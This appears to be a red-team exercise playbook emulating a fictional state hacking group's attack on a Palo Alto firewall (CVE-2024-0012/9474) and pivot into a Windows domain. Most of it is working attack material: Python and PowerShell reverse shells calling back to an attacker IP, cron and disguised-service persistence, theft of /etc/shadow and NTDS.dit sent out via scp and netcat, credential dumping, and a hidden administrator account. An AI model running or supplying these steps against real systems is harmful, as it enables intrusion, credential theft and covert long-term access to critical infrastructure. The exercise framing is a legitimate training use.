# Introduction

Background: Sassy Panda is an Eastonian government affiliated cyber group falling under the Eastonian Cyber Agency (ECA) and comprised of Easton’s most sophisticated capabilities and equipment. Sassy Panda typically focuses on espionage and information gathering and has targeted critical infrastructure in the U.S. including the New England region. Having been active for over 15 years in the computer network exploitation game, the group has emphasized stealth in operations using web shells, living-off-the-land (LOTL) binaries, hands-on-keyboard activities, and stolen credentials.

TTPS:

Enterprise:

Account Discovery: Domain Account, Archive Collected Data: Archive via Utility, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Compromise Infrastructure: Server, Compromise Infrastructure: Botnet, Credentials from Password Stores, Data from Local System, Data Staged, Local Data Staging, Encrypted Channel: Symmetric Cryptography, Exploit Public-Facing Application, Indicator Removal: File Deletion, Indicator Removal: Clear Network Connection History and Configurations, Lateral Tool Transfer, Log Enumeration, Masquerading: Match Legitimate Name or Location, Masquerading: Masquerade File Type, Obtain Capabilities: Tool, OS Credential Dumping: LSASS Memory, OS Credential Dumping: NTDS, Permission Groups Discovery: Local Groups, Permission Groups Discovery: Domain Groups, Process Discovery, Proxy, Internal Proxy, Query Registry, Remote System Discovery, Server Software Component: Web Shell, Software Discovery, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, Valid Accounts: Domain Accounts, Virtualization/Sandbox Evasion: System Checks, Windows Management Instrumentation



Target: Palo Alto firewall management interface at XXX.XXX.XXX.XXX
Exploit Used: PoC.py
CVE: CVE-2024-0012 and CVE-2024-9474


## *REQUIREMENTS*: [ClickPaste](https://github.com/Collective-Software/ClickPaste)

- download from source file
- to copy and paste information simpler to from your HOST to the VM
 
# Phase 0: Initial Setup for Kill Chain

## Exploit Setup:

1. Create a new folder on your `attack box`
   - This will stage all of the required files and scripts.
3. Open a text editor (nano) on the attack machine. `sudo nano PoC.py`
4. Copy PoC.py from your host and paste into VM into the text editor
   - best case of doing this is utilizing `ClickPaste`
6. Press `ctrl+O` and then enter to write out the file, then press `ctrl+S` to save, then press `ctrl+X` to exit the program
7. `chmod +x PoC.py`
   

## Persistence Script Setup:

1. Perform the following command: `nano pan_os_comm.py`
2. In nano, copy and paste the below script: ***NOTE- BE SURE TO CHANGE THE IP ADDRESS AND PORT IN THE "s.connect(("10.10.100.169", 63842))" LINE TO MATCH THE IP ADDRESS OF YOUR ATTACK MACHINE AND A RANDOM HIGH PORT OF YOUR CHOICE- end note :) *** Please remember the random high port you choose as you will have to recall it for use in setting up your initial listener and throwing the export.

```
#!/usr/bin/env python3

import socket
import subprocess
import os
import pty

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("10.10.100.169", 63842))

os.dup2(s.fileno(), 0)

os.dup2(s.fileno(), 1)

os.dup2(s.fileno(), 2)

pty.spawn("sh")

```

3. Once created, run the following command: `chmod +x pan_os_comm.py`
### *Host Your Tools Folder On A Web Server*

1. In the folder where you have created your tools, start a web server to host the necessary files for the exploit
   Run the below command to start the web server:
   `python3 -m http.server <port>`


*Update Your rockyou.txt Wordlist For Later Password Cracking*

Through OSINT and recon, we have located a list of compromised passwords from users within this company. Lets update our rockyou.txt password list to perform offline cracking hashes.

1. Locate your rockyou.txt file and open using sudo.
2. Once open, append the below to list of passwords to the to the list.
   	`sudo nano /usr/share/wordlists/rockyou.txt
   	 (copy and paste the below list)
         ctrl+O
   	 ctrl+X`

PASSWORD LIST:   
```
Summer2025
JohnDoe123
Password123!
Football@2023
C0ffeeMorn1ng
Ilov3mydog!
ChocolateCake1
BlueSky_2024
P@ssword2024!
Tiger@12345
!LoveCoding4U
Il0vePizza!
$uperman2024
RedCar$2023
L0veMyPet$
PurpleRain2024
!BrightSun2023
P@rtn3rInLife!
M@rtha12!
FishingTrip#2024
Coffee_@123
B@by_Queen23
NewYork2024!
BestD@y2024
E@gleEye2023
Amazing_2024!
St@rWars123
!QAZ@WSX1qaz2wsx
Sugar@L0ve
Little_Lamb2024
Super@star23
T1me2W1n
Alp@caFarm2024
B@by1Cats
T3aTime#2024
Gr@ndma!2023
Working@Home
L@ndscape_123
Nature@Beach2024
Morning!Vibes
Winter!2024_
D0gLovers123
K!ttenTime2024
PuppyLove_23
Peachy@Life24
Fancy_2024!
BeachTime24
SleepyM0rning!
G0ldenMoon#23
CoolDays@123
```

- Now that you are fully set up, move to Phase 1.

# Phase 1: Initial Access via Palo Alto Exploit

Section 1. Setting Up Listeners

1. Open up your terminal, and if you dont already have 4, go to your terminal preferences and change the settings to start with 4 panes.
2. In one of the terminal panes, set up your initial lsitener using Netcat to catch the callback shell from the exploit. Be sure to note the port that you are using for this listener, as it will be needed when initiating the exploit.
   	`nc -lnv <random port>`
3. In another terminal pane, set up a second listener to catch the beacon once the cron job is set up on the compromised Palo. Use the port provided in the *pan_os_comm.py* script that was created earlier.
4. Run the following command to start the second listener:
	`nc -lnv <port used in script>`

Section 2. Execute the PoC Script

1. In one of the empty terminal panes, execute the PoC.py script to trigger the exploit:
   	`python PoC.py https://<ip_of_palo_management_interface> <ip_address_of_attack_box> <port_of_initial_listener>`
2. Watch the initial listener pane to ensure it catches the callback from the exploit.
   	If you see the following, you have successfully exploited the Palo Alto and now have a limited bash shell into the root of the system:
	![image](https://github.com/user-attachments/assets/0d3b2d49-fe66-4dcb-80da-51204efebfbc)

   	If you do not see the following, its time to troubleshoot.
   	Troubleshooting steps:
   	1. Ensure you are using the correct IP addresses and ports in your listeners and exploit arguments
   	2. Ensure there is routing to the Palo Management Interface.
   	3. Ensure you copied your exploit script over correctly
   	4. If all else fails, find a Sassy Panda SME and pray they have the answers :-)




# Phase 2: Palo Persistence

Once you are in the Palo Alto's bash shell, remember that this shell has limited functionality. Features like the tab key for autocompletion and the up/down arrow keys won’t work. The first priority is to establish persistence using a cron job and the pan_os_comm.py script you created earlier.

1. Start by running some basic enumeration commands to get a sense of your current environment on the machine.
   ```
   whoami (response should be "root")
   pwd
   ls
   ```
2. Next, import the pan_os_comm.py script from your attack machine, where it is being hosted via the web server.
   `wget -O /usr/local/bin/pan_os_comm.py http://<IP_of_your_attack_box>:<port>/pan_os_comm.py`

3. To ensure that the file has been successfully downloaded and is executable, run:
   `ls -l /usr/local/bin | grep pan_os`

4. Once you’ve confirmed the script is there, it’s time to set up the cron job to maintain persistence. To add the cron job, execute the following command:
   `(crontab -l 2>/dev/null; echo "* * * * * /usr/bin/python3 /usr/local/bin/pan_os_comm.py >/dev/null 2>&1") | crontab -`
	NOTE- This will add a cron job that runs every minute, calling your pan_os_comm.py script and sending a beacon to your second listener.

5. To check that your cron job has been successfully added, run the following:
   `crontab -l`
   	NOTE- This should display the current cron jobs, confirming that the job was added. The cron job will send a beacon to your listener every minute, ensuring that even if you lose access, you can reopen the listener using the same port, and it will catch the beacon again.

# Phase 3: Enumeration and Exfil

Now that we have a way to return to the system, let’s gather critical files containing sensitive data, which can be exfiltrated and reviewed offline for password cracking.

1. We’ll start by viewing some important files and saving them to a new document for exfiltration:
   ```
   cat /etc/passwd > users.txt
   cat /etc/shadow >> users.txt  # Notice the '>>', it appends the content of /etc/shadow
   cat /etc/hosts >> users.txt   # Append /etc/hosts to the same file

   ```
   NOTE: The >> operator ensures that the contents of /etc/shadow and /etc/hosts are appended to users.txt. If you use >, the file will be overwritten.

2. Next, use SCP to securely copy the users.txt file to your attack machine:
   `scp users.txt kali@<your_ip_address>:.`
	NOTE: Make sure to replace <your_ip_address> with the actual IP address of your attack machine, and specify the path where you want the file to be saved.

3. On your attack machine, open a new terminal, navigate to your home folder, and check if the file has been transferred successfully:
   ```
   cd ~
   ls | grep users.txt
   ```
4. Once you’ve confirmed that the file has been successfully transferred, you can exit the compromised machine. Your beacon terminal should still be active, allowing you to regain access at any time.
   `exit`




	
   






# Phase 3: Internal Reconnaissance & Enumeration
Once inside the firewall OS:
### Identify internal interfaces and routes

```bash
ip addr
ip route
cat /etc/resolv.conf
```

# Look for management configs or logs

```bash
cat /config/config.xml | grep -i 'mgmt\|admin\|ldap\|radius'
```

## 🧨 Final Red Team Implant: `pan_os_comm.sh` with Stealthy Service

### 1. 🎯 Start the Listener on (ATTACKER)

```bash
nc -lvnp 63842
```

### 2. 📁 Create the Reverse Shell Script (ATTACKER)

```bash
sudo vim /tmp/pan_os_comm.py
```

`i`
```python
usr/bin/env python3 

import socket,subprocess,os;

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.100.169",63842));

os.dup2(s.fileno(),0); 

os.dup2(s.fileno(),1);

os.dup2(s.fileno(),2);

import pty; pty.spawn("sh")
```
`:wq!`

```bash
cd /tmp
wget http://10.10.100.169/pan_os_comm.py
```
### 4. Change perms of python file (VICTIM)
Make it executable:
```bash
chmod +x /tmp/pan_os_comm.py
```
### 5. Add Crontab every minute (VICTIM)

```bash
(crontab -l 2>/dev/null; echo '* * * * * /bin/systemctl start pan_os_comm.service >/dev/null 2>&1') | crontab -
```
---
# Attempt to pivot through firewall if routing/NAT is enabled
- sshuttle/reverse SOCKS proxy (chisel, socat) to tunnel traffic into the internal 
network.

# Phase 3: Target Discovery Inside Orange Space
Assuming pivot success to internal hosts:
#### Scan internal subnets for DC or LDAP
```bash
nmap -p 389,445,88,135,139,389,636,3268,3269 -sV -Pn 172.20.0.0/16
```

- Look for the Domain Controller (likely in orange-servers or orange-users).

# Phase 4: Credential Access (via LDAP, SAM/NTDS)
- Once a DC is identified (e.g., 172.20.2.X), you can:
	- 88, 389
- Enumerate via LDAP (LOLBAS):
```bash
ldapsearch -x -h 172.20.2.X -b "dc=orange,dc=local"
```
If admin rights are obtained, dump credentials:
1. Use secretsdump from Impacket
```bash
impacket-secretsdump 'orange.local/adminuser:password@172.20.2.X'
```
2. If on host with NTDS.dit access:
	Copy ntds.dit and SYSTEM hive for offline cracking
```bash
copy C:\Windows\NTDS\ntds.dit D:\stolen\
reg save hklm\system D:\stolen\system.hiv
```
Transfer those over SMB/certutil:
```bash
certutil -urlcache -f http://<attacker_ip>/nc.exe nc.exe
nc.exe <attacker_ip> 4444 < ntds.dit
nc.exe <attacker_ip> 4445 < system.hiv
```
Then parse locally:
```bash
secretsdump.py -ntds ntds.dit -system system.hiv LOCAL
```
# Phase 5: Lateral Movement and Persistence
Use Admin Shares:
```bash
wmic /node:172.20.0.X process call create "cmd.exe /c whoami"
psexec.py orange.local/adminuser@172.20.0.X
```
### Create a hidden user (LOLBAS):
```bash
net user stealthyUser P@ssw0rd! /add
net localgroup administrators stealthyUser /add
```
## Persist via Scheduled Task or Service:

```bash
schtasks /create /tn "Updater" /tr "powershell -NoP -NonI -W Hidden -Enc <payload>" /sc minute /mo 15
```
## 🔧 Step-by-Step: Install `WinDefMon` Reverse Shell Service on DC

### 1. 📜 **Reverse Shell Payload**

Save this script as `C:\ProgramData\winmon.ps1` on the **Domain Controller**:

```powershell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",9999)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2  = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

---
### 2. 🔐 **Base64 Encode It**

```powershell
$payload = Get-Content -Raw C:\ProgramData\winmon.ps1
$bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
$encoded = [Convert]::ToBase64String($bytes)
```

---
### 3. ⚙️ **Create the Service as WinDefMon**

```powershell
$cmd = "powershell.exe -NoP -W Hidden -Enc $encoded"
sc.exe create WinDefMon binPath= "$cmd" start= auto
sc.exe start WinDefMon
```

💡 *Use quotes properly after `binPath=` and ensure the encoded string doesn't break on multiple lines if scripting.*

---
### 4. 🧪 **Start Your Listener**

```bash
nc -lvnp 9999
```
---

Or use registry run keys:

```bash
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t 

REG_SZ /d "powershell.exe -WindowStyle Hidden -File C:\Users\Public\rev.ps1"
```

Phase 6: OT Network Target Prep (Later Stage)







# Teardown
## 🧼 Teardown (DC)

```powershell
sc stop WinDefMon
sc delete WinDefMon
Remove-Item C:\ProgramData\winmon.ps1 -Force
```
